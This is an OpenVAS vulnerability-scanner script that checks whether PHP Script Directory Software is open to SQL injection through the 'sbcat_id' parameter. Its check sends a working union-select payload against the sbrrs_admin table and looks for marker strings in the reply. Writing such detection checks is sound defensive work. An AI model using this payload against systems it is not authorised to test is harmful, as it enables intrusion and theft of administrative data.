###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_script_directory_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# PHP Script Directory Software 'sbcat_id' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain sensitive information.
  Impact Level: Application";
tag_affected = "PHP Script Directory Software";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the
  'sbcat_id' parameter in 'showcats.php', which allows attacker to manipulate
  SQL queries by injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 18th February, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.softbizsolutions.com/script-directory-software.php";
tag_summary = "The host is running PHP Script Directory Software and is prone to SQL
  injection vulnerability.";

if(description)
{
  script_id(801729);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-02-23 12:24:37 +0100 (Wed, 23 Feb 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("PHP Script Directory Software 'sbcat_id' Parameter SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16069/");

  script_description(desc);
  script_summary("Determine if PHP Script Directory software is prone to SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir(make_list("/resources", "/script", "/phpscript", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get (item: string (dir,"/index.php"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if('>Script Directory Software - directory software - PHP script directory software<' >< res)
  {
    ## Try SQL injection and check the response to confirm vulnerability
    url = dir + "/showcats.php?sbcat_id=-9999+union+all+select+2,concat" +
          "(0x4f70656e564153,0x3a,0x3a,0x4f70656e564153,0x3a),4,6,7+from+sbrrs" +
          "_admin--";
    if(http_vuln_check(port:port, url:url, pattern:'>OpenVAS:(.+):OpenVAS<'))
    {
      security_hole(port:port);
      exit(0);
    }
  }
}
